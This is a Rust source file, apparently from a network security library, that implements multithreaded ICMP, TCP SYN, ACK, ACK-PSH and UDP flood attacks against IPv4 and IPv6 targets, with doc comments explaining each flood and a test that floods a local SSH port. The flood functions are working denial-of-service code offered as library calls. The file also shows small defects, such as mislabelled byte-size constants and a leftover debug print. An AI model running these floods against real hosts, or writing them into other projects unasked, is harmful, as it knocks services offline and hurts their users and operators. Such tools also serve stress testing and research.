use prettytable::row;
use prettytable::Cell;
use prettytable::Row;
use prettytable::Table;
use std::collections::HashMap;
use std::fmt;
use std::net::IpAddr;
use std::net::Ipv4Addr;
use std::net::Ipv6Addr;
use std::sync::mpsc::channel;
use std::time::Duration;
use std::time::Instant;

pub mod icmp;
pub mod icmpv6;
pub mod tcp;
pub mod tcp6;
pub mod udp;
pub mod udp6;

use crate::errors::PistolErrors;
use crate::utils::find_source_addr;
use crate::utils::find_source_addr6;
use crate::utils::get_threads_pool;
use crate::utils::random_port;
use crate::Target;

#[derive(Debug, Clone)]
pub struct FloodAttackDetail {
    pub send_packets: usize,
    pub send_traffic: f64,
    pub elapsed_time: Duration,
}

impl FloodAttackDetail {
    pub fn new() -> FloodAttackDetail {
        FloodAttackDetail {
            send_packets: 0,
            send_traffic: 0.0,
            elapsed_time: Duration::new(0, 0),
        }
    }
}

#[derive(Debug, Clone)]
pub struct FloodAttackSummary {
    pub summary: HashMap<IpAddr, HashMap<u16, FloodAttackDetail>>,
    pub total_send_packets: usize,
    pub total_send_traffic: f64,
    pub total_elapsed_time: Duration,
}

impl FloodAttackSummary {
    pub fn new() -> FloodAttackSummary {
        FloodAttackSummary {
            summary: HashMap::new(),
            total_send_packets: 0,
            total_send_traffic: 0.0,
            total_elapsed_time: Duration::new(0, 0),
        }
    }
    pub fn enrichment(&mut self) {
        let mut total_send_packets = 0;
        let mut total_send_traffic = 0.0;
        for (_ip, hm) in &self.summary {
            for (_port, detail) in hm {
                total_send_packets += detail.send_packets;
                total_send_traffic += detail.send_traffic;
            }
        }
        self.total_send_packets = total_send_packets;
        self.total_send_traffic = total_send_traffic;
    }
}

impl fmt::Display for FloodAttackSummary {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        const BYTES_PER_GB: u64 = 1024 * 1024;
        const BYTES_PER_MB: u64 = 1024;
        let mut table = Table::new();
        table.add_row(Row::new(vec![Cell::new("Flood Attack Summary")
            .style_spec("c")
            .with_hspan(3)]));
        table.add_row(row!["Addr", "Port", "Details"]);
        for (ip, hm) in &self.summary {
            for (port, detail) in hm {
                let traffc_str = if detail.send_traffic / BYTES_PER_GB as f64 > 1.0 {
                    format!("{:.1} GB", detail.send_traffic / BYTES_PER_GB as f64)
                } else if detail.send_traffic / BYTES_PER_MB as f64 > 1.0 {
                    format!("{:.1} MB", detail.send_traffic / BYTES_PER_MB as f64)
                } else {
                    format!("{:.1} Bytes", detail.send_traffic)
                };
                let detail_str = format!(
                    "packets: {}\ntraffic: {}\ntime: {:.1}",
                    detail.send_packets,
                    traffc_str,
                    detail.elapsed_time.as_secs_f32(),
                );
                table.add_row(row![ip, port, detail_str]);
            }
        }
        write!(f, "{}", table.to_string())
    }
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum FloodMethods {
    Icmp,
    Syn,
    Ack,
    AckPsh,
    Udp,
}

fn run_flood(
    method: FloodMethods,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    src_ipv4: Ipv4Addr,
    src_port: u16,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<(usize, usize, Duration), PistolErrors> {
    let start_time = Instant::now();
    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };
    let mut total_send_buff_size = 0;
    let mut count = 0;
    let (tx, rx) = channel();
    let pool = get_threads_pool(threads_num);
    let mut recv_size = 0;

    for _ in 0..max_flood_packet {
        recv_size += 1;
        let tx = tx.clone();
        pool.execute(move || {
            let send_buff_size = match func(dst_ipv4, dst_port, src_ipv4, src_port, max_same_packet)
            {
                Ok(s) => s + 14, // Ethernet frame header length.
                Err(_) => 0,
            };
            match tx.send(send_buff_size) {
                _ => (),
            }
        });
    }
    let iter = rx.into_iter().take(recv_size);
    for send_buff_size in iter {
        total_send_buff_size += send_buff_size;
        count += 1;
    }
    Ok((
        count * max_flood_packet,
        total_send_buff_size,
        start_time.elapsed(),
    ))
}

fn run_flood6(
    method: FloodMethods,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    src_ipv6: Ipv6Addr,
    src_port: u16,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<(usize, usize, Duration), PistolErrors> {
    let start_time = Instant::now();
    let func = match method {
        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet,
        FloodMethods::Syn => tcp6::send_syn_flood_packet,
        FloodMethods::Ack => tcp6::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp6::send_udp_flood_packet,
    };
    let mut total_send_buff_size = 0;
    let mut count = 0;
    let (tx, rx) = channel();
    let pool = get_threads_pool(threads_num);
    let mut recv_size = 0;

    for _ in 0..max_flood_packet {
        recv_size += 1;
        let tx = tx.clone();
        pool.execute(move || {
            let send_buff_size = match func(dst_ipv6, dst_port, src_ipv6, src_port, max_same_packet)
            {
                Ok(s) => s + 14, // Ethernet frame header length.
                Err(_) => 0,
            };
            match tx.send(send_buff_size) {
                _ => (),
            }
        });
    }
    let iter = rx.into_iter().take(recv_size);
    for send_buff_size in iter {
        total_send_buff_size += send_buff_size;
        count += 1;
    }
    Ok((
        count * max_flood_packet,
        total_send_buff_size,
        start_time.elapsed(),
    ))
}

fn ipv4_flood(
    method: FloodMethods,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: u16,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<(usize, usize, Duration), PistolErrors> {
    let src_ipv4 = match find_source_addr(src_addr, dst_ipv4)? {
        Some(s) => s,
        None => return Err(PistolErrors::CanNotFoundSourceAddress),
    };
    let ret = if method == FloodMethods::Icmp {
        run_flood(
            method,
            dst_ipv4,
            0,
            src_ipv4,
            src_port,
            threads_num,
            max_same_packet,
            max_flood_packet,
        )
    } else {
        run_flood(
            method,
            dst_ipv4,
            dst_port,
            src_ipv4,
            src_port,
            threads_num,
            max_same_packet,
            max_flood_packet,
        )
    };
    ret
}

fn ipv6_flood(
    method: FloodMethods,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: u16,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<(usize, usize, Duration), PistolErrors> {
    let src_ipv6 = match find_source_addr6(src_addr, dst_ipv6)? {
        Some(s) => s,
        None => return Err(PistolErrors::CanNotFoundSourceAddress),
    };
    let ret = if method == FloodMethods::Icmp {
        run_flood6(
            method,
            dst_ipv6,
            0,
            src_ipv6,
            src_port,
            threads_num,
            max_same_packet,
            max_flood_packet,
        )
    } else {
        run_flood6(
            method,
            dst_ipv6,
            dst_port,
            src_ipv6,
            src_port,
            threads_num,
            max_same_packet,
            max_flood_packet,
        )
    };
    ret
}

pub fn flood(
    target: Target,
    method: FloodMethods,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttackSummary, PistolErrors> {
    let (tx, rx) = channel();
    let pool = get_threads_pool(threads_num);
    let mut recv_size = 0;

    let src_port = match src_port {
        Some(p) => p,
        None => random_port(),
    };

    for host in target.hosts {
        let dst_addr = host.addr;
        match dst_addr {
            IpAddr::V4(dst_ipv4) => {
                for dst_port in host.ports {
                    let dst_port = dst_port.clone();
                    let tx = tx.clone();
                    recv_size += 1;
                    pool.execute(move || {
                        let ret = ipv4_flood(
                            method,
                            dst_ipv4,
                            dst_port,
                            src_addr,
                            src_port,
                            threads_num,
                            max_same_packet,
                            max_flood_packet,
                        );
                        match tx.send((dst_addr, 0, ret)) {
                            _ => (),
                        }
                    });
                }
            }
            IpAddr::V6(dst_ipv6) => {
                for dst_port in host.ports {
                    let dst_port = dst_port.clone();
                    let tx = tx.clone();
                    recv_size += 1;
                    pool.execute(move || {
                        let ret = ipv6_flood(
                            method,
                            dst_ipv6,
                            dst_port,
                            src_addr,
                            src_port,
                            threads_num,
                            max_same_packet,
                            max_flood_packet,
                        );
                        match tx.send((dst_addr, 0, ret)) {
                            _ => (),
                        }
                    });
                }
            }
        }
    }

    let mut s = FloodAttackSummary::new();
    let iter = rx.into_iter().take(recv_size);
    for (ip, port, ret) in iter {
        let mut detail = FloodAttackDetail::new();
        match ret {
            Ok((packets, traffic, elapsed)) => {
                println!(">>> {}", traffic);
                detail.send_packets = packets;
                detail.send_traffic = traffic as f64;
                detail.elapsed_time = elapsed;
            }
            Err(e) => return Err(e),
        }

        match s.summary.get_mut(&ip.into()) {
            Some(hm) => {
                hm.insert(port, detail);
            }
            None => {
                let mut hm = HashMap::new();
                hm.insert(port, detail);
                s.summary.insert(ip.into(), hm);
            }
        }
    }
    s.enrichment();
    Ok(s)
}

/// An Internet Control Message Protocol (ICMP) flood DDoS attack, also known as a Ping flood attack,
/// is a common Denial-of-Service (DoS) attack in which an attacker attempts to overwhelm a targeted device with ICMP echo-requests (pings).
/// Normally, ICMP echo-request and echo-reply messages are used to ping a network device in order to diagnose the health and connectivity of the device and the connection between the sender and the device.
/// By flooding the target with request packets, the network is forced to respond with an equal number of reply packets.
/// This causes the target to become inaccessible to normal traffic.
pub fn icmp_flood(
    target: Target,
    src_addr: Option<IpAddr>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttackSummary, PistolErrors> {
    flood(
        target,
        FloodMethods::Icmp,
        src_addr,
        Some(0),
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn icmp_flood_raw(
    dst_addr: IpAddr,
    src_addr: Option<IpAddr>,
    max_same_packet: usize,
) -> Result<usize, PistolErrors> {
    let dst_port = 0;
    let src_port = None;
    flood_raw(
        FloodMethods::Icmp,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

/// In a TCP SYN Flood attack, the malicious entity sends a barrage of SYN requests to a target server but intentionally avoids sending the final ACK.
/// This leaves the server waiting for a response that never comes, consuming resources for each of these half-open connections.
pub fn tcp_syn_flood(
    target: Target,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttackSummary, PistolErrors> {
    flood(
        target,
        FloodMethods::Syn,
        src_addr,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_syn_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolErrors> {
    flood_raw(
        FloodMethods::Syn,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

/// TCP ACK flood, or 'ACK Flood' for short, is a network DDoS attack comprising TCP ACK packets.
/// The packets will not contain a payload but may have the PSH flag enabled.
/// In the normal TCP, the ACK packets indicate to the other party that the data have been received successfully.
/// ACK packets are very common and can constitute 50% of the entire TCP packets.
/// The attack will typically affect stateful devices that must process each packet and that can be overwhelmed.
/// ACK flood is tricky to mitigate for several reasons. It can be spoofed;
/// the attacker can easily generate a high rate of attacking traffic,
/// and it is very difficult to distinguish between a Legitimate ACK and an attacking ACK, as they look the same.
pub fn tcp_ack_flood(
    target: Target,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttackSummary, PistolErrors> {
    flood(
        target,
        FloodMethods::Ack,
        src_addr,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_ack_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolErrors> {
    flood_raw(
        FloodMethods::Ack,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

/// TCP ACK flood with PSH flag set.
pub fn tcp_ack_psh_flood(
    target: Target,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttackSummary, PistolErrors> {
    flood(
        target,
        FloodMethods::AckPsh,
        src_addr,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_ack_psh_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolErrors> {
    flood_raw(
        FloodMethods::AckPsh,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

/// In a UDP Flood attack, the attacker sends a massive number of UDP packets to random ports on the target host.
/// This barrage of packets forces the host to:
/// Check for applications listening at each port.
/// Realize that no application is listening at many of these ports.
/// Respond with an Internet Control Message Protocol (ICMP) Destination Unreachable packet.
pub fn udp_flood(
    target: Target,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttackSummary, PistolErrors> {
    flood(
        target,
        FloodMethods::Udp,
        src_addr,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn udp_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolErrors> {
    flood_raw(
        FloodMethods::Udp,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

pub fn flood_raw(
    method: FloodMethods,
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolErrors> {
    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };
    let func6 = match method {
        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet,
        FloodMethods::Syn => tcp6::send_syn_flood_packet,
        FloodMethods::Ack => tcp6::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp6::send_udp_flood_packet,
    };
    let src_port = match src_port {
        Some(p) => p,
        None => random_port(),
    };
    match dst_addr {
        IpAddr::V4(dst_ipv4) => {
            match find_source_addr(src_addr, dst_ipv4)? {
                Some(src_ipv4) => {
                    let send_buff_size =
                        match func(dst_ipv4, dst_port, src_ipv4, src_port, max_same_packet) {
                            Ok(s) => s + 14, // Ethernet frame header length.
                            Err(_) => 0,
                        };
                    Ok(send_buff_size)
                }
                None => Err(PistolErrors::CanNotFoundSourceAddress),
            }
        }
        IpAddr::V6(dst_ipv6) => {
            match find_source_addr6(src_addr, dst_ipv6)? {
                Some(src_ipv6) => {
                    let send_buff_size =
                        match func6(dst_ipv6, dst_port, src_ipv6, src_port, max_same_packet) {
                            Ok(s) => s + 14, // Ethernet frame header length.
                            Err(_) => 0,
                        };
                    Ok(send_buff_size)
                }
                None => Err(PistolErrors::CanNotFoundSourceAddress),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Host;
    use crate::Target;
    use crate::TEST_IPV4_LOCAL;
    #[test]
    fn test_flood() {
        let src_ipv4 = None;
        let src_port: Option<u16> = None;
        let threads_num: usize = 128;
        let host = Host::new(TEST_IPV4_LOCAL.into(), Some(vec![22]));
        let target: Target = Target::new(vec![host]);
        let ret = tcp_syn_flood(target, src_ipv4, src_port, threads_num, 3, 3).unwrap();
        println!("{}", ret);
    }
}
